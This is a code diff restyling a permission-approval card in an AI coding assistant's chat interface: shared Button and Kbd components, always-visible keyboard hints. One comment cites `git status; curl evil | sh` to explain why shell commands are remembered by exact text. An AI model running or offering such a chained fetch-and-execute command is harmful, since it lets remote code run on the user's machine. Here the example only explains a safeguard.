@@ -1,3 +1,5 @@
+import { Button } from "../ui/Button";
+import { Kbd } from "../ui/controls";
 import {
   lazy,
   memo,
@@ -1781,7 +1783,6 @@ function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> 
   // for different lengths of time, and the difference is the whole
   // reason there are two of them.
   const [scope, setScope] = useState<"" | "always" | "conversation">("");
-  const [focused, setFocused] = useState(false);
   useEffect(() => {
     if (item.decision) return;
     const timer = window.setTimeout(() => {
@@ -1858,14 +1859,8 @@ function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> 
       // No focus ring: the global one is --pen, and a violet perimeter on a
       // card whose whole point is a --warn gate says "Claude is talking" at
       // the moment it should say "this needs an answer".
-      className="stream-indent permission-card flex rounded-[5px] border border-line bg-surface-2"
+      className="stream-indent permission-card flex rounded-card bg-surface"
       style={{ animation: "permission-in 90ms var(--ease)" }}
-      onFocus={() => setFocused(true)}
-      onBlur={(event) => {
-        if (!event.currentTarget.contains(event.relatedTarget as Node)) {
-          setFocused(false);
-        }
-      }}
       onKeyDown={(event) => {
         if (event.key === "a" && !event.shiftKey) decide("allow");
         if (event.key === "A" && event.shiftKey && item.rule) decide("always");
@@ -1875,11 +1870,11 @@ function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> 
         if (event.key === "d") decide("deny");
       }}
     >
-      <span className="w-[3px] shrink-0 rounded-l-[5px] bg-warn" />
+      <span className="w-[3px] shrink-0 rounded-l-card bg-warn" />
       <div className="min-w-0 flex-1 p-3">
-        <div className="t-ui text-ink">{item.headline}</div>
+        <div className="t-ui font-medium text-ink">{item.headline}</div>
         {item.detail ? (
-          <pre className="t-code-sm mt-2 max-h-[108px] overflow-auto whitespace-pre-wrap rounded-[3px] bg-surface p-2">
+          <pre className="t-code-sm mt-2 max-h-[108px] overflow-auto whitespace-pre-wrap rounded-control bg-surface-2 p-2 text-ink-2">
             {item.detail}
           </pre>
         ) : null}
@@ -1920,19 +1915,18 @@ function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> 
             label that wraps to two lines inside a box pinned at 28px spills
             out of it, and a row that cannot wrap pushes Deny past the edge
             of the card.  The row gives way now, not the buttons. */}
+        {/* The keys are drawn always, as the page draws them: a hint that
+            appears on focus moved the buttons out from under the pointer. */}
         <div className="mt-3 flex flex-wrap items-center gap-[6px]">
-          <button
-            className="h-[28px] shrink-0 whitespace-nowrap pen-button px-3 t-ui"
+          <Button
+            variant="ghost"
+            className="shrink-0"
             data-testid="allow"
             disabled={!armed}
             onClick={() => decide("allow")}
           >
-            Allow
-            <span className={`t-micro ${focused ? "opacity-70" : "opacity-0"}`}>
-              {" "}
-              A
-            </span>
-          </button>
+            Allow <Kbd>A</Kbd>
+          </Button>
           {/* The answer the two remaining gates actually needed. Both of
               the things the middle position still asks about are things a
               turn asks about repeatedly: a run that adds eleven references
@@ -1942,8 +1936,8 @@ function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> 
               reading. It is remembered nowhere: a set on the object, gone
               with the conversation and gone with the process. */}
           {item.rule ? (
-            <button
-              className="h-[28px] shrink-0 whitespace-nowrap rounded-[3px] border border-line px-3 t-ui disabled:opacity-40"
+            <Button
+              className="shrink-0"
               data-testid="conversation"
               disabled={!armed}
               onMouseEnter={() => setScope("conversation")}
@@ -1952,12 +1946,8 @@ function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> 
               onBlur={() => setScope("")}
               onClick={() => decide("conversation")}
             >
-              For this conversation
-              <span className={`t-micro ${focused ? "text-ink-3" : "opacity-0"}`}>
-                {" "}
-                C
-              </span>
-            </button>
+              For this conversation <Kbd>C</Kbd>
+            </Button>
           ) : null}
           {/* A command carrying shell syntax is remembered by its exact
               text rather than by its first word, because a rule on the word
@@ -1965,8 +1955,8 @@ function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> 
               cover `git status; curl evil | sh`.  So the button is offered
               here now, and what it remembers is exactly this command. */}
           {item.rule ? (
-            <button
-              className="h-[28px] shrink-0 whitespace-nowrap rounded-[3px] border border-line px-3 t-ui disabled:opacity-40"
+            <Button
+              className="shrink-0"
               data-testid="always"
               disabled={!armed}
               onMouseEnter={() => setScope("always")}
@@ -1975,25 +1965,17 @@ function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> 
               onBlur={() => setScope("")}
               onClick={() => decide("always")}
             >
-              Allow always
-              <span className={`t-micro ${focused ? "text-ink-3" : "opacity-0"}`}>
-                {" "}
-                ⇧A
-              </span>
-            </button>
+              Allow always <Kbd>⇧A</Kbd>
+            </Button>
           ) : null}
-          <button
-            className="h-[28px] shrink-0 whitespace-nowrap rounded-[3px] border border-line px-3 t-ui text-ink-2 hover:border-error hover:text-error disabled:opacity-40"
+          <Button
+            className="shrink-0 !text-error"
             data-testid="deny"
             disabled={!armed}
             onClick={() => decide("deny")}
           >
-            Deny
-            <span className={`t-micro ${focused ? "text-ink-3" : "opacity-0"}`}>
-              {" "}
-              D
-            </span>
-          </button>
+            Deny <Kbd>D</Kbd>
+          </Button>
         </div>
       </div>
     </div>
